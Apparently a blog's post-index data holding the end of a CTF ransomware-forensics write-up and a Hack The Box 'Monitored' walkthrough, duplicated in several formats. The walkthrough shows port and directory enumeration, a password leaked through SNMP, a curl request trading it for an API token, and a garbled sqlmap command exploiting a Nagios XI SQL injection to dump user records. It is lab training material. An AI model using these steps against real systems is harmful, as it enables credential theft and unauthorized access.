<code>lokilocker</code></li>\n</ul>\n<p>To complete this question, just put the ransomware’s MD5 hash to any OSINT tool and check its family labels.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win4.png\"></p>\n<ol start=\"4\">\n<li>What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)</li>\n</ol>\n<ul>\n<li>Answer: <code>Loki</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with keyword ‘schtasks’ which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win5.png\"></p>\n<ol start=\"5\">\n<li>What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)</li>\n</ol>\n<ul>\n<li>Answer: <code>powershell.exe_3856</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win6.png\"></p>\n<ol start=\"6\">\n<li>Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf)</li>\n</ol>\n<ul>\n<li>Answer: <code>C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>Security</code> log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious <code>.docx</code> file</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win7.png\"></p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win8.png\"></p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win9.png\"></p>\n<ol start=\"7\">\n<li>When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)</li>\n</ol>\n<ul>\n<li>Answer: <code>2023-09-20_03:03:20</code></li>\n</ul>\n<p>To complete this question, we can just view the XML format of the <code>.docx</code> file and find the <code>TimeCreated SystemTime</code> row. ENSURE THE TIME FORMAT IS IN UTC!</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win10.png\"></p>\n"},{"title":"Monitored","date":"2024-02-29T08:30:03.000Z","draft":false,"description":"Monitored HacktheBox Writeup","top_img":"/images/cyberpunk-red.jpg","_content":"\n![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png)\n\nToday we'll be covering an interesting box called *Monitored* introduced with a medium level difficulty so let's check it out.\n\n### Nmap Scans.\n\nStarting off with some port enumeration we get some interesting ports open.\n\n```bash\nPORT     STATE  SERVICE          VERSION\n22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n53/tcp   closed domain\n80/tcp   open   http             Apache httpd 2.4.56\n135/tcp  closed msrpc\n389/tcp  open   ldap\n139/tcp  closed netbios-ssn\n445/tcp  closed microsoft-ds\n464/tcp  closed kpasswd5\n593/tcp  closed http-rpc-epmap\n636/tcp  closed ldapssl\n1433/tcp closed ms-sql-s\n3268/tcp closed globalcatLDAP\n3269/tcp closed globalcatLDAPssl\n5667/tcp open   tcpwrapped\nService Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n```\n## Web Enumeration (port 80)\n\nIntially checking port 80 it redirects to `nagios.monitored.htb` \n![](https://imgur.com/ELNHUOG.png) checking the site out. We are redirected to nagios XI.\n![](https://imgur.com/rcKawD1.png) which is a server and networking monitoring software.\n\n## Fuzzing port 80.\nTrying login with the default credentials found online didn't provide us with access, hence the next step was to fuzz for some directory that might be hidden.\n\n```bash\n.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]\n                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]\n.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]\n.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]\n.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]\n.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]\n.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]\n.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]\ncgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]\ncgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]\nindex.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]\nindex.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]\njavascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]\nnagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]\nserver-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]\n```\nWe see that the `nagios` directory seems interesting but navigating tot the directory doesn't produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory `nagiosxi`.\n\n## nagiosxi\n\nFuzzing the directory we get some interesting directories, \n\n```bash\n# directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]\nhelp                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]\ntools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]\nmobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]\nadmin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]\nreports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]\naccount                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]\nincludes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]\nbackend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]\ndb                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]\napi                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]\nconfig                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]\nviews                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]\nsounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]\nterminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]\n```\nChecking out `terminal` directory, there's a shell in box gui which after trying out soem authentication bypasses it didn't work.\nLater on went on to fuzz the `api` endpoint. \n\n## API \n\nFuzzing the API endpoints gives us 2 endpoints the `v1` and `includes`. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.\n\n**Note**: \nIf we visit /api/v1/xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.`\n\n```bash\n\nlicense                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]\n%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]\nvideo games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]\nauthenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]\n```\n\nWe get an interesting endpoint called authenticate but trying to access it we find that, we can only use `POST` to authenticate and since we don't have any credentials to authenticate with decided to go back to the nmap results and enumerate more.\n\n## UDP\n```bash\nPORT      STATE         SERVICE\n7/udp     open|filtered echo\n53/udp    open|filtered domain\n68/udp    open|filtered dhcpc\n123/udp   open          ntp\n161/udp   open          snmp\n162/udp   open|filtered snmptrap\n16838/udp open|filtered unknown\n18617/udp open|filtered unknown\n21131/udp open|filtered unknown\n21698/udp open|filtered unknown\n28547/udp open|filtered unknown\n49181/udp open|filtered unknown\n```\n\nEnumerating UDP ports, we find that snmp is open, enumerating snmp using [braa](https://github.com/mteg/braa) a mass snmp scanner. We get interesting results.\n```bash\niso.3.6.1.2.1.25.4.2.1.5.505 = STRING: \"--config /etc/laurel/config.toml\"\niso.3.6.1.2.1.25.4.2.1.5.549 = STRING: \"-f\"\niso.3.6.1.2.1.25.4.2.1.5.550 = STRING: \"--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only\"\niso.3.6.1.2.1.25.4.2.1.5.553 = STRING: \"-n -iNONE\"\niso.3.6.1.2.1.25.4.2.1.5.556 = STRING: \"-u -s -O /run/wpa_supplicant\"\niso.3.6.1.2.1.25.4.2.1.5.568 = STRING: \"-f\"\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \"-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \"\niso.3.6.1.2.1.25.4.2.1.5.642 = STRING: \"-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\"\niso.3.6.1.2.1.25.4.2.1.5.762 = STRING: \"-f /usr/local/nagios/etc/pnp/npcd.cfg\"\niso.3.6.1.2.1.25.4.2.1.5.769 = STRING: \"-LOw -f -p /run/snmptrapd.pid\"\niso.3.6.1.2.1.25.4.2.1.5.783 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\"\niso.3.6.1.2.1.25.4.2.1.5.804 = STRING: \"-p /var/run/ntpd.pid -g -u 108:116\"\niso.3.6.1.2.1.25.4.2.1.5.806 = STRING: \"-o -p -- \\\\u --noclear tty1 linux\"\niso.3.6.1.2.1.25.4.2.1.5.841 = STRING: \"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\"\niso.3.6.1.2.1.25.4.2.1.5.843 = STRING: \"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\"\niso.3.6.1.2.1.25.4.2.1.5.848 = STRING: \"-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d\"\niso.3.6.1.2.1.25.4.2.1.5.860 = STRING: \"-k start\"\niso.3.6.1.2.1.25.4.2.1.5.870 = STRING: \"-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf\"\niso.3.6.1.2.1.25.4.2.1.5.942 = STRING: \"/usr/sbin/snmptt --daemon\"\niso.3.6.1.2.1.25.4.2.1.5.943 = STRING: \"/usr/sbin/snmptt --daemon\"\niso.3.6.1.2.1.25.4.2.1.5.972 = STRING: \"-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6\"\niso.3.6.1.2.1.25.4.2.1.5.976 = STRING: \"-d /usr/local/nagios/etc/nagios.cfg\"\niso.3.6.1.2.1.25.4.2.1.5.977 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\niso.3.6.1.2.1.25.4.2.1.5.978 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\niso.3.6.1.2.1.25.4.2.1.5.979 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\n```\n\nwe identify there's a user called `svc` and also a passowrd that the user tried to authenticate with.\n```bash\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \"-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \"\n```\n\n## Initial Foothold.\n\nNow having creds to login and hving prior knowledge that we have a few instances on the `API` and `terminal` endpoints that we had to try out, started out with the terminal endpoint, didn't give us any results, proceeded to the `API` endpoint where we are need to construct a post request so as to authenticate.\n\n![](https://imgur.com/dEBYn5d.png)\n\nAn Auth Token Obtain after using curl.\n\n```bash \ncurl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```\n\n```bash \n{\"username\":\"svc\",\"user_id\":\"2\",\"auth_token\":\"76064ac8a8a9ece7c349404e1f99a45665e9acfc\",\"valid_min\":5,\"valid_until\":\"Fri, 23 Feb 2024 22:38:15 -0500\"}\n```\nwe get an auth token, going back to the `nagios` directory, we can authenticate and successfully login.\n\n![](https://imgur.com/fHkual8.png)\n\n\nAccording with this [CVE](https://www.cve.org/CVERecord?id=CVE-2023-40931) there is a Post-Auth SQLi, so let’s try POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges\n\n```bash\nsqlmap -u \"https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate\" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users | awk -F'\"' '{print$12}'\" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users\n\n```\n\n\n","source":"_posts/htb/manager.md","raw":"---\ntitle: \"Monitored\"\ndate: 2024-02-29T11:30:03+00:00\ndraft: false\ntags: [\"htb\"]\ndescription: \"Monitored HacktheBox Writeup\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png)\n\nToday we'll be covering an interesting box called *Monitored* introduced with a medium level difficulty so let's check it out.\n\n### Nmap Scans.\n\nStarting off with some port enumeration we get some interesting ports open.\n\n```bash\nPORT     STATE  SERVICE          VERSION\n22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n53/tcp   closed domain\n80/tcp   open   http             Apache httpd 2.4.56\n135/tcp  closed msrpc\n389/tcp  open   ldap\n139/tcp  closed netbios-ssn\n445/tcp  closed microsoft-ds\n464/tcp  closed kpasswd5\n593/tcp  closed http-rpc-epmap\n636/tcp  closed ldapssl\n1433/tcp closed ms-sql-s\n3268/tcp closed globalcatLDAP\n3269/tcp closed globalcatLDAPssl\n5667/tcp open   tcpwrapped\nService Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n```\n## Web Enumeration (port 80)\n\nIntially checking port 80 it redirects to `nagios.monitored.htb` \n![](https://imgur.com/ELNHUOG.png) checking the site out. We are redirected to nagios XI.\n![](https://imgur.com/rcKawD1.png) which is a server and networking monitoring software.\n\n## Fuzzing port 80.\nTrying login with the default credentials found online didn't provide us with access, hence the next step was to fuzz for some directory that might be hidden.\n\n```bash\n.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]\n                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]\n.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]\n.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]\n.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]\n.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]\n.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]\n.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]\ncgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]\ncgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]\nindex.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]\nindex.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]\njavascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]\nnagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]\nserver-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]\n```\nWe see that the `nagios` directory seems interesting but navigating tot the directory doesn't produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory `nagiosxi`.\n\n## nagiosxi\n\nFuzzing the directory we get some interesting directories, \n\n```bash\n# directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]\nhelp                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]\ntools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]\nmobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]\nadmin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]\nreports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]\naccount                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]\nincludes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]\nbackend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]\ndb                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]\napi                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]\nconfig                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]\nviews                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]\nsounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]\nterminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]\n```\nChecking out `terminal` directory, there's a shell in box gui which after trying out soem authentication bypasses it didn't work.\nLater on went on to fuzz the `api` endpoint. \n\n## API \n\nFuzzing the API endpoints gives us 2 endpoints the `v1` and `includes`. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.\n\n**Note**: \nIf we visit /api/v1/xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.`\n\n```bash\n\nlicense                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]\n%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]\nvideo games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]\nauthenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]\n```\n\nWe get an interesting endpoint called authenticate but trying to access it we find that, we can only use `POST` to authenticate and since we don't have any credentials to authenticate with decided to go back to the nmap results and enumerate more.\n\n## UDP\n```bash\nPORT      STATE         SERVICE\n7/udp     open|filtered echo\n53/udp    open|filtered domain\n68/udp    open|filtered dhcpc\n123/udp   open          ntp\n161/udp   open          snmp\n162/udp   open|filtered snmptrap\n16838/udp open|filtered unknown\n18617/udp open|filtered unknown\n21131/udp open|filtered unknown\n21698/udp open|filtered unknown\n28547/udp open|filtered unknown\n49181/udp open|filtered unknown\n```\n\nEnumerating UDP ports, we find that snmp is open, enumerating snmp using [braa](https://github.com/mteg/braa) a mass snmp scanner. We get interesting results.\n```bash\niso.3.6.1.2.1.25.4.2.1.5.505 = STRING: \"--config /etc/laurel/config.toml\"\niso.3.6.1.2.1.25.4.2.1.5.549 = STRING: \"-f\"\niso.3.6.1.2.1.25.4.2.1.5.550 = STRING: \"--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only\"\niso.3.6.1.2.1.25.4.2.1.5.553 = STRING: \"-n -iNONE\"\niso.3.6.1.2.1.25.4.2.1.5.556 = STRING: \"-u -s -O /run/wpa_supplicant\"\niso.3.6.1.2.1.25.4.2.1.5.568 = STRING: \"-f\"\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \"-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \"\niso.3.6.1.2.1.25.4.2.1.5.642 = STRING: \"-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\"\niso.3.6.1.2.1.25.4.2.1.5.762 = STRING: \"-f /usr/local/nagios/etc/pnp/npcd.cfg\"\niso.3.6.1.2.1.25.4.2.1.5.769 = STRING: \"-LOw -f -p /run/snmptrapd.pid\"\niso.3.6.1.2.1.25.4.2.1.5.783 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\"\niso.3.6.1.2.1.25.4.2.1.5.804 = STRING: \"-p /var/run/ntpd.pid -g -u 108:116\"\niso.3.6.1.2.1.25.4.2.1.5.806 = STRING: \"-o -p -- \\\\u --noclear tty1 linux\"\niso.3.6.1.2.1.25.4.2.1.5.841 = STRING: \"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\"\niso.3.6.1.2.1.25.4.2.1.5.843 = STRING: \"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\"\niso.3.6.1.2.1.25.4.2.1.5.848 = STRING: \"-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d\"\niso.3.6.1.2.1.25.4.2.1.5.860 = STRING: \"-k start\"\niso.3.6.1.2.1.25.4.2.1.5.870 = STRING: \"-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf\"\niso.3.6.1.2.1.25.4.2.1.5.942 = STRING: \"/usr/sbin/snmptt --daemon\"\niso.3.6.1.2.1.25.4.2.1.5.943 = STRING: \"/usr/sbin/snmptt --daemon\"\niso.3.6.1.2.1.25.4.2.1.5.972 = STRING: \"-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6\"\niso.3.6.1.2.1.25.4.2.1.5.976 = STRING: \"-d /usr/local/nagios/etc/nagios.cfg\"\niso.3.6.1.2.1.25.4.2.1.5.977 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\niso.3.6.1.2.1.25.4.2.1.5.978 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\niso.3.6.1.2.1.25.4.2.1.5.979 = STRING: \"--worker /usr/local/nagios/var/rw/nagios.qh\"\n```\n\nwe identify there's a user called `svc` and also a passowrd that the user tried to authenticate with.\n```bash\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \"-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \"\n```\n\n## Initial Foothold.\n\nNow having creds to login and hving prior knowledge that we have a few instances on the `API` and `terminal` endpoints that we had to try out, started out with the terminal endpoint, didn't give us any results, proceeded to the `API` endpoint where we are need to construct a post request so as to authenticate.\n\n![](https://imgur.com/dEBYn5d.png)\n\nAn Auth Token Obtain after using curl.\n\n```bash \ncurl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```\n\n```bash \n{\"username\":\"svc\",\"user_id\":\"2\",\"auth_token\":\"76064ac8a8a9ece7c349404e1f99a45665e9acfc\",\"valid_min\":5,\"valid_until\":\"Fri, 23 Feb 2024 22:38:15 -0500\"}\n```\nwe get an auth token, going back to the `nagios` directory, we can authenticate and successfully login.\n\n![](https://imgur.com/fHkual8.png)\n\n\nAccording with this [CVE](https://www.cve.org/CVERecord?id=CVE-2023-40931) there is a Post-Auth SQLi, so let’s try POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges\n\n```bash\nsqlmap -u \"https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate\" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users | awk -F'\"' '{print$12}'\" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users\n\n```\n\n\n","slug":"htb/manager","published":1,"updated":"2024-07-16T20:39:06.317Z","_id":"clyouz1j2000awgjna3vd65l2","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png\"></p>\n<p>Today we’ll be covering an interesting box called <em>Monitored</em> introduced with a medium level difficulty so let’s check it out.</p>\n<h3 id=\"Nmap-Scans\"><a href=\"#Nmap-Scans\" class=\"headerlink\" title=\"Nmap Scans.\"></a>Nmap Scans.</h3><p>Starting off with some port enumeration we get some interesting ports open.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT     STATE  SERVICE          VERSION</span><br><span class=\"line\">22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class=\"line\">53/tcp   closed domain</span><br><span class=\"line\">80/tcp   open   http             Apache httpd 2.4.56</span><br><span class=\"line\">135/tcp  closed msrpc</span><br><span class=\"line\">389/tcp  open   ldap</span><br><span class=\"line\">139/tcp  closed netbios-ssn</span><br><span class=\"line\">445/tcp  closed microsoft-ds</span><br><span class=\"line\">464/tcp  closed kpasswd5</span><br><span class=\"line\">593/tcp  closed http-rpc-epmap</span><br><span class=\"line\">636/tcp  closed ldapssl</span><br><span class=\"line\">1433/tcp closed ms-sql-s</span><br><span class=\"line\">3268/tcp closed globalcatLDAP</span><br><span class=\"line\">3269/tcp closed globalcatLDAPssl</span><br><span class=\"line\">5667/tcp open   tcpwrapped</span><br><span class=\"line\">Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"Web-Enumeration-port-80\"><a href=\"#Web-Enumeration-port-80\" class=\"headerlink\" title=\"Web Enumeration (port 80)\"></a>Web Enumeration (port 80)</h2><p>Intially checking port 80 it redirects to <code>nagios.monitored.htb</code><br><img src=\"https://imgur.com/ELNHUOG.png\"> checking the site out. We are redirected to nagios XI.<br><img src=\"https://imgur.com/rcKawD1.png\"> which is a server and networking monitoring software.</p>\n<h2 id=\"Fuzzing-port-80\"><a href=\"#Fuzzing-port-80\" class=\"headerlink\" title=\"Fuzzing port 80.\"></a>Fuzzing port 80.</h2><p>Trying login with the default credentials found online didn’t provide us with access, hence the next step was to fuzz for some directory that might be hidden.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]</span><br><span class=\"line\">                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]</span><br><span class=\"line\">.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]</span><br><span class=\"line\">.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]</span><br><span class=\"line\">.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]</span><br><span class=\"line\">.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]</span><br><span class=\"line\">.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]</span><br><span class=\"line\">.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]</span><br><span class=\"line\">cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class=\"line\">cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class=\"line\">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]</span><br><span class=\"line\">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]</span><br><span class=\"line\">javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]</span><br><span class=\"line\">nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]</span><br><span class=\"line\">server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]</span><br></pre></td></tr></table></figure>\n<p>We see that the <code>nagios</code> directory seems interesting but navigating tot the directory doesn’t produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory <code>nagiosxi</code>.</p>\n<h2 id=\"nagiosxi\"><a href=\"#nagiosxi\" class=\"headerlink\" title=\"nagiosxi\"></a>nagiosxi</h2><p>Fuzzing the directory we get some interesting directories, </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]</span></span><br><span class=\"line\"><span class=\"built_in\">help</span>                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]</span><br><span class=\"line\">tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]</span><br><span class=\"line\">mobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]</span><br><span class=\"line\">admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]</span><br><span class=\"line\">reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]</span><br><span class=\"line\">account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]</span><br><span class=\"line\">includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]</span><br><span class=\"line\">backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]</span><br><span class=\"line\">db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]</span><br><span class=\"line\">api                     [Status: 